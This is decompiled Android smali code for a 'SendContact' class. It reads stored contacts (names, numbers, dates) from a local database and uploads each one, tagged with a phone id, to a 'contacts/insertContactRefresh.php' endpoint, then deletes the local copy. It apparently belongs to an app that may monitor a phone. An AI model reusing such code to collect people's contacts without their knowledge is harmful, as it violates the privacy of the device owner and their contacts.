.class public final Lee;
.super Ljava/lang/Object;
.source "SendContact.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field private static a:Z


# instance fields
.field private final b:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0

    .line 22
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 23
    iput-object p1, p0, Lee;->b:Landroid/content/Context;

    return-void
.end method

.method private a()V
    .locals 4

    .line 81
    :try_start_0
    invoke-static {}, Lcom/app/service/UploadDataService;->a()V

    .line 83
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "UploadDataService.getmNbTask() : "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 85
    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v0

    if-gtz v0, :cond_0

    .line 86
    iget-object v0, p0, Lee;->b:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lee;->b:Landroid/content/Context;

    const-class v3, Lcom/app/service/UploadDataService;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 89
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method


# virtual methods
.method public final declared-synchronized run()V
    .locals 15

    monitor-enter p0

    const/4 v0, 0x0

    .line 29
    :try_start_0
    sget-boolean v1, Lee;->a:Z

    if-eqz v1, :cond_0

    .line 30
    invoke-direct {p0}, Lee;->a()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 31
    monitor-exit p0

    return-void

    :cond_0
    const/4 v1, 0x1

    .line 34
    :try_start_1
    sput-boolean v1, Lee;->a:Z

    .line 36
    new-instance v2, Lbn;

    iget-object v3, p0, Lee;->b:Landroid/content/Context;

    invoke-direct {v2, v3}, Lbn;-><init>(Landroid/content/Context;)V

    .line 37
    invoke-virtual {v2}, Lbn;->a()V

    .line 1054
    iget-object v4, v2, Lbn;->a:Landroid/database/sqlite/SQLiteDatabase;

    const-string v5, "TABLE_CONFIG_CONTACTS"

    const/4 v3, 0x5

    new-array v6, v3, [Ljava/lang/String;

    const-string v3, "id"

    aput-object v3, v6, v0

    const-string v3, "name"

    aput-object v3, v6, v1

    const-string v3, "number"

    const/4 v12, 0x2

    aput-object v3, v6, v12

    const-string v3, "idcontact"

    const/4 v13, 0x3

    aput-object v3, v6, v13

    const-string v3, "date"

    const/4 v14, 0x4

    aput-object v3, v6, v14

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-virtual/range {v4 .. v11}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    if-eqz v3, :cond_3

    .line 42
    invoke-interface {v3}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-lez v4, :cond_3

    .line 43
    invoke-interface {v3}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_3

    .line 45
    :cond_1
    new-instance v4, Lex$c;

    invoke-direct {v4}, Lex$c;-><init>()V

    .line 46
    invoke-interface {v3, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-virtual {v4, v5}, Lex$c;->a(I)V

    .line 47
    invoke-interface {v3, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lex$c;->b(Ljava/lang/String;)V

    .line 48
    invoke-interface {v3, v12}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lex$c;->c(Ljava/lang/String;)V

    .line 49
    invoke-interface {v3, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lex$c;->a(Ljava/lang/String;)V

    .line 50
    invoke-interface {v3, v14}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lex$c;->d(Ljava/lang/String;)V

    .line 52
    new-instance v5, Ljava/util/HashMap;

    invoke-direct {v5}, Ljava/util/HashMap;-><init>()V

    const-string v6, "idPhone"

    .line 53
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, p0, Lee;->b:Landroid/content/Context;

    invoke-static {v8}, Lda;->f(Landroid/content/Context;)I

    move-result v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "name"

    .line 54
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4}, Lex$c;->c()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "number"

    .line 55
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4}, Lex$c;->d()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "idContact"

    .line 56
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4}, Lex$c;->b()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "date"

    .line 57
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4}, Lex$c;->e()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "contacts/insertContactRefresh.php"

    .line 59
    invoke-static {v6, v5}, Lcv;->a(Ljava/lang/String;Ljava/util/Map;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 60
    invoke-virtual {v4}, Lex$c;->a()I

    move-result v4

    .line 2050
    iget-object v5, v2, Lbn;->a:Landroid/database/sqlite/SQLiteDatabase;

    const-string v6, "TABLE_CONFIG_CONTACTS"

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "id = "

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v4, v7}, Landroid/database/sqlite/SQLiteDatabase;->delete(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I

    move-result v4

    .line 63
    :cond_2
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 66
    :cond_3
    invoke-virtual {v2}, Lbn;->b()V

    if-eqz v3, :cond_4

    .line 68
    invoke-interface {v3}, Landroid/database/Cursor;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_1

    :catch_0
    move-exception v1

    .line 71
    :try_start_2
    invoke-static {}, Lcom/crashlytics/android/Crashlytics;->getInstance()Lcom/crashlytics/android/Crashlytics;

    move-result-object v2

    iget-object v2, v2, Lcom/crashlytics/android/Crashlytics;->core:Lcom/crashlytics/android/core/CrashlyticsCore;

    const-string v3, "SendContact"

    invoke-virtual {v2, v3}, Lcom/crashlytics/android/core/CrashlyticsCore;->log(Ljava/lang/String;)V

    .line 72
    invoke-static {v1}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    .line 75
    :cond_4
    :goto_0
    sput-boolean v0, Lee;->a:Z

    .line 76
    invoke-direct {p0}, Lee;->a()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 77
    monitor-exit p0

    return-void

    :goto_1
    monitor-exit p0

    throw v0

    return-void
.end method
